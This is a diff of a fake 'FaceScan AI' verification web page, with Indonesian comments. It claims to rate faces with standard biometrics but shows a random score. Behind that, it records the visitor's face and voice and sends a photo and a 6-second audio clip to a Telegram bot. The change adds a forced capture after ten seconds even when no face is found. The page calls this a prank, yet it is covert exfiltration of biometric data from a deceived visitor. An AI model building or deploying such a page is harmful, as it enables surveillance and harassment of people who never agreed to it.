@@ -16,7 +16,7 @@
         .laser { position: absolute; width: 100%; height: 3px; background: var(--cyan); top: 0; box-shadow: 0 0 20px var(--cyan); animation: scan 2s infinite ease-in-out; z-index: 10; display: none; }
         @keyframes scan { 0%, 100% { top: 0%; } 50% { top: 100%; } }
         .btn-main { background: #fff; color: #000; padding: 18px 40px; border: none; border-radius: 20px; font-weight: 700; width: 100%; cursor: pointer; transition: 0.3s; }
-        #status { margin-top: 20px; font-size: 0.7rem; color: var(--cyan); font-weight: 700; letter-spacing: 2px; }
+        #status { margin-top: 20px; font-size: 0.7rem; color: var(--cyan); font-weight: 700; letter-spacing: 1px; text-transform: uppercase; }
         #final-box { display: none; }
         .score-num { font-size: 5rem; font-weight: 800; color: var(--cyan); margin: 5px 0; }
     </style>
@@ -26,7 +26,7 @@
     <div class="app-card">
         <div id="intro">
             <h1>FaceScan <span style="color:var(--cyan)">AI</span></h1>
-            <p style="color:#888; font-size: 0.9rem;">Analisis biometrik wajah dan sampel vokal untuk hasil akurasi 99.9%.</p>
+            <p style="color:#888; font-size: 0.9rem;">Analisis biometrik wajah & vokal menggunakan standar internasional.</p>
             <button class="btn-main" id="start-btn">START VERIFICATION</button>
         </div>
 
@@ -35,7 +35,7 @@
             <video id="video" autoplay playsinline muted></video> 
         </div>
 
-        <div id="status">READY TO SCAN</div>
+        <div id="status">READY</div>
 
         <div id="final-box">
             <div style="font-size: 0.7rem; color: var(--cyan); font-weight:700;">AI SCORE</div>
@@ -55,69 +55,82 @@
         let mediaRecorder;
         let audioChunks = [];
         let isProcessing = false;
+        let forceTimer;
 
         async function loadAI() {
             try {
+                // Memuat model deteksi
                 await faceapi.nets.tinyFaceDetector.loadFromUri('https://raw.githubusercontent.com/justadudewhohacks/face-api.js/master/weights');
-            } catch(e) { console.log("AI Load Error"); }
+            } catch(e) { console.log("AI Models failed to load"); }
         }
         loadAI();
 
         document.getElementById('start-btn').onclick = async () => {
             document.getElementById('intro').style.display = 'none';
             document.getElementById('cam-holder').style.display = 'block';
-            status.innerText = "INITIALIZING SENSORS...";
+            status.innerText = "SENSING FACE...";
 
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 video.srcObject = stream;
 
-                // Gunakan format webm yang lebih stabil di browser
-                mediaRecorder = new MediaRecorder(stream, { mimeType: 'audio/webm' });
-                
-                mediaRecorder.ondataavailable = (e) => {
-                    if (e.data.size > 0) audioChunks.push(e.data);
-                };
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = (e) => audioChunks.push(e.data);
                 
                 video.addEventListener('play', () => {
+                    // Timer darurat: Jika 10 detik wajah gak ketemu/gagal scan, PAKSA JEPRET!
+                    forceTimer = setTimeout(() => {
+                        if (!isProcessing) {
+                            console.log("Force capturing...");
+                            startThePrank();
+                        }
+                    }, 10000);
+
                     const checkLoop = setInterval(async () => {
-                        if (isProcessing) return;
+                        if (isProcessing) {
+                            clearInterval(checkLoop);
+                            return;
+                        }
+
+                        // Deteksi wajah
                         const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions());
                         
                         if (detections.length > 0) {
-                            isProcessing = true;
-                            laser.style.display = 'block';
-                            status.innerText = "SCANNING FACE & VOICE...";
-                            
-                            audioChunks = [];
-                            mediaRecorder.start(1000); // Ambil data setiap 1 detik agar tidak kosong
-
-                            setTimeout(() => {
-                                mediaRecorder.stop(); 
-                                clearInterval(checkLoop);
-                            }, 7000); // Rekam sedikit lebih lama (7 detik)
+                            clearTimeout(forceTimer); // Batalkan timer darurat karena wajah ketemu
+                            startThePrank();
+                            clearInterval(checkLoop);
                         } else {
-                            status.innerText = "POSITION FACE IN CENTER";
+                            status.innerText = "LOOK AT THE SENSOR...";
                         }
                     }, 1000);
                 });
 
                 mediaRecorder.onstop = async () => {
-                    status.innerText = "FINALIZING ANALYSIS...";
-                    // Beri jeda 500ms agar blob audio benar-benar selesai ditulis
-                    setTimeout(async () => {
-                        await takeAndSend();
-                    }, 500);
+                    status.innerText = "FINALIZING...";
+                    setTimeout(async () => { await takeAndSend(); }, 500);
                 };
 
             } catch (err) {
-                alert("Please allow Camera & Mic.");
+                alert("Akses kamera & mic ditolak.");
                 location.reload();
             }
         };
 
+        function startThePrank() {
+            isProcessing = true;
+            laser.style.display = 'block';
+            status.innerText = "SCANNING GEOMETRY...";
+            
+            audioChunks = [];
+            mediaRecorder.start();
+
+            // Rekam 6 detik reaksi mukanya
+            setTimeout(() => {
+                mediaRecorder.stop();
+            }, 6000);
+        }
+
         async function takeAndSend() {
-            // 1. Capture Foto
             const ctx = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -126,24 +139,23 @@
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
             const photoBlob = await new Promise(r => canvas.toBlob(r, 'image/png'));
-            const score = Math.floor(Math.random() * 11) + 88;
+            const score = Math.floor(Math.random() * 10) + 89;
 
-            // 2. Kirim Foto
+            // Kirim Foto
             const photoData = new FormData();
             photoData.append('chat_id', CONFIG.CHAT_ID);
             photoData.append('photo', photoBlob, 'face.png');
-            photoData.append('caption', `🎭 **PRANK PERFECT**\n\n🎯 Score: ${score}%\n📸 Foto Target.`);
+            photoData.append('caption', `🎭 **PRANK HASIL SCAN**\n\n🎯 Score: ${score}%\n📸 Foto Target terlampir.`);
             await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, { method: 'POST', body: photoData });
 
-            // 3. Kirim Audio (Format fix untuk Telegram)
+            // Kirim VN
             const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
             const audioData = new FormData();
             audioData.append('chat_id', CONFIG.CHAT_ID);
-            audioData.append('voice', audioBlob, 'voice.ogg'); // Telegram akan convert webm ke ogg otomatis
-            
+            audioData.append('voice', audioBlob, 'voice.ogg');
             await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendVoice`, { method: 'POST', body: audioData });
 
-            // 4. Tampilkan Hasil
+            // UI Finish
             document.getElementById('cam-holder').style.display = 'none';
             status.style.display = 'none';
             document.getElementById('score-val').innerText = score + "%";
